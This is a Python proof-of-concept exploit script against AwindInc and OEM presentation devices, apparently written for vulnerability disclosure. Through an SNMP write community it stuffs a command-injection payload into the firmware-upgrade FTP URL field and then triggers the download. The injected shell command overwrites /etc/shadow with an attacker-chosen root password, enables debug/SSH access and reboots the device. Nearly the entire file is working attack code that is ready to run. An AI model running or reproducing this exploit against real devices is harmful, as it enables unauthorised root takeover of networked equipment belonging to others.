#!/usr/bin/env python
"""
This module exploits a vulnerability found in AwindInc and OEM'ed products
where untrusted inputs are fed to ftpfw.sh system command, leading to command injection.

Note: a valid SNMP read-write community is required to exploit this vulnerability.
"""
from pysnmp.hlapi import *
import socket
import time
import os
import argparse

def inject_payload(target, community="private", payload=""):
    errorIndication, errorStatus, errorIndex, varBinds = next(
        setCmd(SnmpEngine(),
        CommunityData(community),
        UdpTransportTarget((target, 161)),
        ContextData(),
        ObjectType(
                ObjectIdentity('.1.3.6.1.4.1.3212.100.3.2.9.1.0'),
                OctetString(payload)
            )
         )
    )
    if errorIndication:
        print(errorIndication)
        return 0
    elif errorStatus:
        print('%s at %s' % (errorStatus.prettyPrint(),
        errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))
        return 0
    else:
        for varBind in varBinds:
            print(' = '.join([x.prettyPrint() for x in varBind]))
    return 1

def trigger_injection(target, community="private"):

    errorIndication, errorStatus, errorIndex, varBinds = next(
        setCmd(SnmpEngine(),
        CommunityData(community),
        UdpTransportTarget((target, 161)),
        ContextData(),
        ObjectType(
                ObjectIdentity('.1.3.6.1.4.1.3212.100.3.2.9.5.0'),
                Integer32(1)
            )
         )
    )
    if errorIndication:
        print(errorIndication)
        return 0
    elif errorStatus:
        print('%s at %s' % (errorStatus.prettyPrint(),
        errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))
        return 0
    else:
        for varBind in varBinds:
            print(' = '.join([x.prettyPrint() for x in varBind]))
    return 1

if __name__ == "__main__":
    if os.geteuid() != 0:
        print "[!] You need to run this script with root privileges."
    else:
        parser = argparse.ArgumentParser(description="SNMP/TFTP")
        parser.add_argument("target")
        parser.add_argument("community")
        args = parser.parse_args()

        # set root password to our own value, enable SSH server and reboot
        cmd = "mount -o remount,rw / && echo 'root:$6$0fkukdLY$35sIH00UcgmsyWtIPtkjSEdbMcpaGKoX7gRT2XtM1Sxij9SgfoV/Om6kiSGU9evxY56yHaA0wsbvfHsjEcBKO0:0:0:99999:7:::' > /etc/shadow && /mnt/AwGetCfg set RD_DEBUG_MODE 1 && reboot"
        # the payload must starts with a valid FTP URI otherwise the injection
        # point is not reached
        payload = "ftp://192.168.100.1/$(%s)" % cmd
        # the MIB states that camFWUpgradeFTPURL must be 255 bytes long so we pad
        payload += "A" * (255-len(payload))

        # we inject our payload in camFWUpgradeFTPURL
        print "[+] Injecting payload ..."
        if not inject_payload(args.target, args.community, payload):
            raise Exception("An error occured during the payload injection.")

        # we trigger the firmware download via FTP, which will end up calling this
        # "/bin/getRemoteURL.sh %s %s %s %d"
        print "[+] Triggering call ..."
        if not trigger_injection(args.target, args.community):
            raise Exception("An error occured during injection trigger.")
        print "[+] Waiting for the device to reboot ..."
        time.sleep(60)
